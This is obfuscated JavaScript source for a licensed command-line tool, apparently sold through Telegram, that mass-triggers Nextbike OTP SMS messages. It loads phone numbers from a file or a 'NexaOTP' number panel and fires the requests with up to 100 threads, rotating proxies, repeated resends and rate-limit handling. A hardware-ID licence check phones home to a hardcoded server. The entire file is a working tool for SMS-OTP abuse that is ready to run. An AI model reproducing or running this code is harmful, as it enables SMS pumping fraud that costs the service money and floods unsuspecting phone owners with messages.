  v93.accept = "application/json", v93["accept-language"] = "en-GB", v93["user-agent"] = v92, v93["accept-encoding"] = "gzip", v93["accept-charset"] = "UTF-8";
  const v94 = v93;
  try {
    {
      let v95 = await sendRequest(v91, "GET", v94, null, v87, timeout),
        v96 = v95.data;
      if (v95.status === 200 && v96.includes("server_time")) {
        {
          onStatus("[1/1] ✅ SMS successfully triggered");
          const v97 = {};
          return v97.success = true, v97.message = "SMS successfully triggered", v97.phone = v88, v97;
        }
      } else {
        let v98 = "Unknown Error";
        if (v95.status === 429) v98 = "HTTP 429 Too Many Requests (Blocked)";
        if (v95.status === 403) v98 = "HTTP 403 Forbidden (Proxy Blocked / Limits)";
        const v99 = {};
        return v99.success = false, v99.message = "Failed: " + v98 + " - HTTP " + v95.status, v99.phone = v88, v99;
      }
    }
  } catch (v100) {
    const v101 = {};
    return v101.success = false, v101.message = "Failed: Proxy/Network Error", v101.phone = v88, v101;
  }
}
if (isMainThread) {
  class Dashboard {
    constructor(v102) {
      {
        this.totalNumbers = v102;
        this.processed = 0;
        this.successful = 0;
        this.failed = 0;
        this.startTime = Date.now();
      }
    }
    ["addLog"](v103, v104) {
      const v105 = {};
      v105.hour12 = false;
      const v106 = new Date().toLocaleTimeString("en-US", v105);
      let v107 = '';
      if (v104 === "success") v107 = B("[NEXTBIKE] [SUCCESS]");else {
        if (v104 === "retry") v107 = Y("[RETRY   ]");else v107 = R("[ERROR   ]");
      }
      const v108 = G('[' + v106 + ']') + '\x20' + v107 + '\x20' + v103;
      process.stdout.write("\r[K" + v108 + '\x0a'), this.render();
    }
    ["setStatus"](v109) {}
    ["update"]() {}
    ["render"]() {
      const v110 = (this.processed / Math.max(this.totalNumbers, 1) * 100).toFixed(1),
        v111 = '\x20\x20' + W.bold("NEXTBIKE") + " ⮞ [" + this.processed + '/' + this.totalNumbers + ']\x20' + v110 + "% │ " + B("Sent: " + this.successful) + " │ " + R("Err: " + this.failed);
      process.stdout.write("\r[K" + v111);
    }
    ["stop"]() {
      process.stdout.write("[2K\r\n");
      const v112 = Math.floor((Date.now() - this.startTime) / 1000),
        v113 = Math.floor(v112 / 60),
        v114 = v112 % 60,
        v115 = v113 + 'm\x20' + v114 + 's';
      console.log(C("  ╔════════════════════════════════════════════╗"));
      console.log(C("  ║") + W.bold("  NEXTBIKE SMS TRIGGER — COMPLETE            ") + C('║')), console.log(C("  ╠════════════════════════════════════════════╣")), console.log(C("  ║") + ('\x20\x20' + chalk.greenBright("Successful") + "   " + chalk.greenBright(String(this.successful).padStart(6)) + "                       ") + C('║')), console.log(C("  ║") + ('\x20\x20' + chalk.red("Failed") + "       " + chalk.red(String(this.failed).padStart(6)) + "                       ") + C('║'));
      console.log(C("  ║") + ('\x20\x20' + chalk.cyan("Total Time") + "   " + chalk.cyan(v115.padEnd(6)) + "                       ") + C('║')), console.log(C("  ╚════════════════════════════════════════════╝\n"));
    }
  }
  async function selectOption(v116, v117) {
    return new Promise(v118 => {
      let v119 = 0;
      process.stdin.resume(), readline.emitKeypressEvents(process.stdin);
      if (process.stdin.isTTY) process.stdin.setRawMode(true);
      const fn4 = () => {
        process.stdout.write("[2J[H");
        printHeader(), console.log("   [33m" + v116 + "[0m\n");
        v117.forEach((v120, v121) => {
          v121 === v119 ? console.log("   [36m➔[32m " + v120.name + "[0m") : console.log("     [90m" + v120.name + "[0m");
        });
      };
      fn4();
      const fn5 = (v122, v123) => {
        if (v123.ctrl && v123.name === 'c') process.exit(0);
        if (v123.name === 'up') v119 = (v119 - 1 + v117.length) % v117.length, fn4();else {
          if (v123.name === "down") v119 = (v119 + 1) % v117.length, fn4();else {
            if (v123.name === "return") {
              process.stdin.setRawMode(false), process.stdin.removeListener("keypress", fn5), v118(v117[v119].value);
            }
          }
        }
      };
      process.stdin.on("keypress", fn5);
    });
  }
  async function promptText(v124, v125) {
    return new Promise(v126 => {
      {
        process.stdout.write("   [33m" + v124 + "[0m ");
        let v127 = '';
        if (process.stdin.isTTY) process.stdin.setRawMode(false);
        process.stdin.resume();
        const fn6 = v128 => {
          {
            const v129 = v128.toString();
            if (v129.includes('\x0a') || v129.includes('\x0d')) {
              process.stdin.removeListener("data", fn6), v127 += v129.split(/[\r\n]/)[0];
              let v130 = v127.trim();
              if (v130.startsWith('\x22') && v130.endsWith('\x22')) {
                v130 = v130.slice(1, -1);
              } else v130.startsWith('\x27') && v130.endsWith('\x27') && (v130 = v130.slice(1, -1));
              v126(v130 || v125);
            } else v127 += v129;
          }
        };
        process.stdin.on("data", fn6);
      }
    });
  }
  async function interactiveWizard() {
    process.stdout.write("[2J[H"), printHeader(), console.log(W.bold("  --- NEXTBIKE THRIFT SENDER  ---\n"));
    const v131 = await selectOption("SELECT NUMBER SOURCE", [{
      'name': "📁 Load from file (numbers.txt)",
      'value': "file"
    }, {
      'name': "🌐 Auto fetch from NexaOTP Panel",
      'value': "nexa"
    }]);
    let v132 = "numbers.txt",
      v133 = null;
    if (v131 === "nexa") {
      {
        let v138 = '';
        if (fs.existsSync(NEXA_KEY_FILE)) {
          v138 = fs.readFileSync(NEXA_KEY_FILE, "utf8").trim();
          const v145 = await selectOption("Saved NexaOTP Key found (" + v138.substring(0, 10) + "...)", [{
            'name': "Use saved key",
            'value': "use"
          }, {
            'name': "Enter new key",
            'value': "new"
          }, {
            'name': "Remove saved key",
            'value': "remove"
          }]);
          if (v145 === "remove") fs.unlinkSync(NEXA_KEY_FILE), v138 = '', console.log(G("\n   ✓ Saved API key removed.\n"));else v145 === "new" && (v138 = '');
        }
        if (!v138) {
          v138 = await promptText("Enter NexaOTP API Key:", '');
          const v146 = {};
          v146.name = 'No', v146.value = 'no';
          const v147 = await selectOption("Save this key for future use?", [{
            'name': "Yes, save it",
            'value': "yes"
          }, v146]);
          v147 === "yes" && (fs.writeFileSync(NEXA_KEY_FILE, v138, "utf8"), console.log(G("\n   ✓ API key saved.\n")));
        }
        let v139 = [],
          v140 = true;
        while (v140) {
          const v148 = await promptText("Enter range #" + (v139.length + 1) + " (e.g. 21624485XXX):", '');
          if (v148) v139.push(v148);
          const v149 = await selectOption("Add another range?", [{
            'name': "Yes",
            'value': "yes"
          }, {
            'name': "No, proceed",
            'value': 'no'
          }]);
          if (v149 === 'no') v140 = false;
        }
        v139.length === 0 && (console.log(R("\n   ✗ You must provide at least one range.\n")), process.exit(1));
        const v141 = await promptText("How many numbers to process? (e.g. 100):", '50'),
          v142 = parseInt(v141) || 50,
          v143 = await selectOption("SELECT NEXA SERVER", [{
            'name': "Server 1 (/get)",
            'value': "/api/v1/numbers/get"
          }, {
            'name': "Server 2 (/p2/get)",
            'value': "/api/v1/numbers/p2/get"
          }, {
            'name': "Server 3 (/p3/get)",
            'value': "/api/v1/numbers/p3/get"
          }]),
          v144 = {};
        v144.apiKey = v138, v144.ranges = v139, v144.totalCount = v142, v144.serverEndpoint = v143, v133 = v144;
      }
    } else {
      v132 = await promptText("Enter Numbers/Emails File Path [default: numbers.txt]:", "numbers.txt");
      if (!fs.existsSync(v132)) fs.writeFileSync(v132, '');
    }
    let v134 = await promptText("Enter Proxies File Path (Leave blank for direct) [default: none]:", "none");
    if (v134 === "none" || v134 === '') v134 = '';
    let v135 = await selectOption("SELECT THREADS", [{
      'name': "10 Threads",
      'value': 0xa
    }, {
      'name': "20 Threads (Default)",
      'value': 0x14
    }, {
      'name': "50 Threads (Fast)",
      'value': 0x32
    }, {
      'name': "100 Threads (Extreme)",
      'value': 0x64
    }, {
      'name': "Custom",
      'value': "custom"
    }]);
    if (v135 === "custom") {
      {
        const v150 = await promptText("Enter custom number of threads:", '20');
        v135 = parseInt(v150) || 20;
      }
    }
    const v136 = await promptText("Enter number of times to resend OTP per phone [default: 1]:", '1');
    const v137 = parseInt(v136) || 1;
    return process.stdin.pause(), {
      'numbersFile': v132,
      'threads': String(v135),
      'proxiesFile': v134,
      'nexaConfig': v133,
      'maxRetries': v137
    };
  }
  function generateHWID() {
    const v151 = require('os'),
      v152 = v151.platform();
    try {
      {
        if (v152 === "win32") {
          const v153 = execSync('powershell -NoProfile -Command "$mg = (Get-ItemProperty \'HKLM:\\SOFTWARE\\Microsoft\\Cryptography\' -ErrorAction SilentlyContinue).MachineGuid; $cpu = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1).ProcessorId; $disk = (Get-CimInstance Win32_LogicalDisk -Filter \'DeviceID=\\\'C:\\\'\' -ErrorAction SilentlyContinue).VolumeSerialNumber; $mb = (Get-CimInstance Win32_BaseBoard -ErrorAction SilentlyContinue).SerialNumber; Write-Output (($mg,$cpu,$disk,$mb) -join \'|\')"', {
            'stdio': "pipe",
            'timeout': 0x3a98
          }).toString().trim();
          if (!v153) throw new Error("No hardware data");
          const v154 = crypto.createHash("sha256").update(v153).digest("hex").toUpperCase();
          return "SKING-" + v154.substring(0, 8) + '-' + v154.substring(8, 12) + '-' + v154.substring(12, 16);
        } else {
          return "SKING-TEST-OS-NOT-WIN";
        }
      }
    } catch (v155) {
      return '';
    }
  }
  function verifyServerSignature(v156, v157) {
    if (!v157) return false;
    const v158 = "-----BEGIN PUBLIC KEY-----\nMCowBQYDK2VwAyEAIU7Pc75ao+Fn7XGC7kFGeDh7JAs3o4NSL2LgmN0YmfY=\n-----END PUBLIC KEY-----";
    try {
      return crypto.verify(null, Buffer.from(v156, "utf8"), v158, Buffer.from(v157, "base64"));
    } catch (v159) {
      return false;
    }
  }
  async function start() {
    const v160 = process.argv.slice(2).filter(v187 => !v187.startsWith('--'));
    let v161 = '';
    v160[5] && v160[5] !== "SKING-UI-HARDWARE-ID" && (v161 = v160[5]);
    if (!v161) {
      v161 = generateHWID();
    }
    globalHwid = v161;
    if (!v161) {
      console.error(R("\n  ✗ Could not generate Hardware ID. Run on Windows.\n")), process.exit(1);
    }
    if (!v160[5] || v160[5] === "SKING-UI-HARDWARE-ID") {
      {
        const v188 = generateHWID();
        v188 !== v161 && (console.error(R("\n  ✗ HWID integrity check failed. Tampering detected.\n")), process.exit(1));
      }
    }
    let v162 = false,
      v163 = "Licensed";
    const v164 = Date.now();
    try {
      const v189 = "188.137.176.163",
        v190 = require("http"),
        v191 = await new Promise((v192, v193) => {
          {
            const v194 = {};
            v194.hwid = v161, v194.app_id = "nextbike", v194.version = "2.0.2", v194.timestamp = v164;
            const v195 = JSON.stringify(v194),
              v196 = {
                'hostname': v189,
                'port': 0xec1,
                'path': "/api/verify",
                'method': "POST",
                'headers': {
                  'Content-Type': "application/json",
                  'Content-Length': Buffer.byteLength(v195)
                },
                'timeout': 0x2710
              },
              v197 = v190.request(v196, v198 => {
                {
                  let v199 = '';
                  v198.on("data", v200 => v199 += v200), v198.on("end", () => {
                    try {
                      v192(JSON.parse(v199));
                    } catch (v201) {
                      v193(v201);
                    }
                  });
                }
              });
            v197.on("error", v193), v197.on("timeout", function () {
              this.destroy(), v193(new Error("Timeout"));
            }), v197.write(v195), v197.end();
          }
        });
      if (v191) {
        {
          v191.status === "update_required" && (console.error(R("\n  ✗ Update required! Please download the latest version.\n")), process.exit(1));
          if (v191.status === "banned" || v191.status === "expired" || !v191.sig) {
            await new Promise(v205 => setTimeout(v205, 2000));
            let v204 = String(v191.reason || "NOT REGISTERED");
            if (!v191.reason && !v191.sig) v204 = "NOT REGISTERED / REMOVED";
            console.error(R("\n  ╔══════════════════════════════════════════════╗")), console.error(R("  ║    ✗ UNAUTHORIZED HARDWARE — NEXTBIKE TOOL  ║")), console.error(R("  ╠══════════════════════════════════════════════╣")), console.error(R("  ║  HWID   : ") + Y(v161.padEnd(33)) + R('║')), console.error(R("  ║  Status : " + v204.padEnd(26) + '║')), console.error(R("  ║  Contact: t.me/Rex_OTP_Tool to register     ║")), console.error(R("  ╚══════════════════════════════════════════════╝\n")), process.exit(1);
          }
          const v202 = v161 + "|nextbike|2.0.2|" + v164;
          !verifyServerSignature(v202, v191.sig) && (console.error(R("\n  ✗ Internal Server Error (500). Please try again later.\n")), process.exit(1));
          v162 = true;
          let v203 = v191.token;
          !v203 && (console.error(R("\n  ✗ Invalid Server Response: Missing Active Session Token. Aborting.\n")), process.exit(1)), setInterval(() => {
            {
              !v203 && (console.error(R("\n  ✗ Session Token lost. Aborting...\n")), process.exit(1));
              const v206 = {};
              v206.hwid = v161, v206.app_id = "nextbike", v206.token = v203;
              const v207 = JSON.stringify(v206),
                v208 = {
                  'hostname': v189,
                  'port': 0xec1,
                  'path': "/api/ping",
                  'method': "POST",
                  'headers': {
                    'Content-Type': "application/json",
                    'Content-Length': Buffer.byteLength(v207)
                  },
                  'timeout': 0x1388
                },
                v209 = v190.request(v208, v210 => {
                  let v211 = '';
                  v210.on("data", v212 => v211 += v212), v210.on("end", () => {
                    try {
                      {
                        const v213 = JSON.parse(v211);
                        v213.status === 'ok' && v213.token ? v203 = v213.token : (console.error(R("\n  ✗ Session invalidated by server (kill). Exiting...\n")), process.exit(1));
                      }
                    } catch (v214) {
                      console.error(R("\n  ✗ Network error during session ping. Exiting...\n")), process.exit(1);
                    }
                  });
                });
              v209.on("error", () => {
                console.error(R("\n  ✗ Disconnected from License Server. Exiting...\n")), process.exit(1);
              }), v209.on("timeout", function () {
                this.destroy(), console.error(R("\n  ✗ License Server timeout. Exiting...\n")), process.exit(1);
              }), v209.write(v207), v209.end();
            }
          }, 45000);
        }
      }
    } catch (v215) {
      console.error(R("\n  ✗ Could not connect to License Server. Check your internet connection.\n")), process.exit(1);
    }
    !v162 && (console.error(R("\n  ✗ License verification failed. Exiting.\n")), process.exit(1));
    let v165 = v160;
    let v166 = null,
      v167 = null;
    if (v165.length === 0) {
      v166 = await interactiveWizard();
    }
    let v168,
      v169,
      v170,
      v171 = 0;
    if (v166 && typeof v166 === "object" && !Array.isArray(v166)) {
      {
        v168 = path.resolve(v166.numbersFile || "numbers.txt");
        v169 = parseInt(v166.threads) || 20;
        v170 = v166.proxiesFile || '';
        if (v170.toLowerCase() === "none" || v170 === "false") v170 = '';
        v167 = v166.nexaConfig || null;
        v171 = v166.maxRetries || 0;
      }
    } else {
      {
        const v216 = v166 || v160;
        v168 = path.resolve(v216[0] || "numbers.txt"), v169 = parseInt(v216[1]) || 20, v170 = v216[2] !== undefined ? v216[2] : "proxies.txt";
        if (v170.toLowerCase() === "none" || v170 === "false") v170 = '';
        v171 = parseInt(v216[3]) || 0;
      }
    }
    printHeader(), console.log(B("  ✓ License: " + v163) + G(" | HWID: " + v161));
    let v172 = [],
      v173 = [],
      v174 = false,
      v175 = 0;
    let v176 = 0,
      v177 = [];
    v167 ? (console.log(Y("\n  [NexaOTP] Streaming " + v167.totalCount + " numbers from panel (" + v167.ranges.length + " range(s))...")), (async () => {
      for (let v217 = 0; v217 < v167.totalCount; v217++) {
        try {
          const v218 = v167.ranges[Math.floor(Math.random() * v167.ranges.length)],
            v219 = await nexaLimiter.enqueue(() => nexaFetchNumber(v167.apiKey, v218, v167.serverEndpoint));
          if (v219) {
            v175++;
            if (v177.length > 0) {
              const v220 = v177.shift();
              v220(v219);
            } else {
              v173.push(v219);
            }
          }
        } catch (v221) {
          v176++;
        }
      }
      v174 = true;
      for (const v222 of v177) v222(null);
      v177 = [];
    })()) : (!fs.existsSync(v168) && (console.error(R("✗ Error: Numbers file not found: " + v168)), process.exit(1)), v172 = fs.readFileSync(v168, "utf8").split(/\r?\n/).map(v223 => v223.trim()).filter(v224 => v224 && v224.replace(/\D/g, '').length >= 7), v172.length === 0 && (console.error(R("✗ No valid phone numbers found in file")), process.exit(1)));
    let v178 = [];
    v170 && fs.existsSync(v170) && (v178 = fs.readFileSync(v170, "utf8").split('\x0a').map(v225 => v225.trim()).filter(v226 => v226.length > 0));
    let v179 = v178.map(parseProxy).filter(Boolean);
    v167 ? console.log(Y("  ✓ Mode: NexaOTP Streaming (" + v167.totalCount + " numbers)")) : console.log(Y("✓ Loaded " + v172.length + " targets"));
    if (v179.length === 0) console.log(G("  No proxies configured (running direct)"));else console.log(G("  Proxies loaded: " + v179.length));
    console.log(C("✓ Threads: " + v169 + '\x0a')), fs.writeFileSync(SUCCESSFUL_FILE, ''), fs.writeFileSync(FAILED_FILE, ''), fs.writeFileSync(DEBUG_FILE, "=== DEBUG SESSION ===\n");
    const v180 = v167 ? v167.totalCount : v172.length,
      v181 = new Dashboard(v180),
      v182 = v167 ? async () => {
        {
          if (v173.length > 0) return v173.shift();
          if (v174) return null;
          return new Promise(v227 => {
            v177.push(v227);
          });
        }
      } : async () => {
        if (v172.length === 0) return null;
        const v228 = Math.floor(Math.random() * v172.length);
        return v172.splice(v228, 1)[0];
      };
    let v183 = 0;
    const fn7 = () => {
      if (v179.length === 0) return null;
      const v229 = v179[v183 % v179.length];
      v183++;
      return rotateSessionId(v229);
    };
    function fn8(v230) {
      try {
        {
          if (v167) return;
          const v231 = fs.readFileSync(v168, "utf8"),
            v232 = v231.split(/\r?\n/).filter(v233 => v233.trim() !== v230.trim()).join('\x0a');
          fs.writeFileSync(v168, v232);
        }
      } catch (v234) {}
    }
    const v184 = v167 ? Math.min(v169, v167.totalCount) : Math.min(v169, v172.length),
      v185 = [],
      v186 = setInterval(() => v181.render(), 500);
    function fn9(v235) {
      return new Promise(v236 => setTimeout(v236, v235));
    }
    async function fn10(v237) {
      while (true) {
        {
          const v238 = await v182();
          if (!v238) break;
          let v239 = 0,
            v240 = false;
          while (v239 < v171) {
            {
              try {
                const v242 = await triggerSms(v238, {
                  'onStatus': v243 => v181.setStatus("Worker " + v237 + ':\x20' + v243),
                  'proxy': fn7(),
                  'timeout': 0x3a98
                });
                if (v242.success) v240 = true, v181.successful++, v181.addLog("SUCCESS - " + v238, "success"), fs.appendFileSync(SUCCESSFUL_FILE, v238 + "|OTP_SENT_SEND_" + (v239 + 1) + '\x0a');else {
                  v181.failed++, v181.addLog("FAILED - " + v238, "error"), fs.appendFileSync(FAILED_FILE, v238 + "|SEND_" + (v239 + 1) + '_' + v242.message + '\x0a');
                }
              } catch (v244) {
                v181.failed++, v181.addLog("FAILED - " + v238, "error");
              }
              v239++;
              if (v239 < v171) await fn9(2500);
            }
          }
          v181.processed++;
          v240 && fn8(v238);
          const v241 = Math.floor(Math.random() * 3000) + 1500;
          await fn9(v241);
        }
      }
    }
    for (let v245 = 0; v245 < v184; v245++) {
      v185.push(fn10(v245));
    }
    await Promise.all(v185), clearInterval(v186), v181.render(), v181.stop();
  }
  start();
}
function fn2(v246) {
  function fn11(v247) {
    fn11(++v247);
  }
  try {
    if (v246) {
      return fn11;
    } else fn11(0);
  } catch (v248) {}
}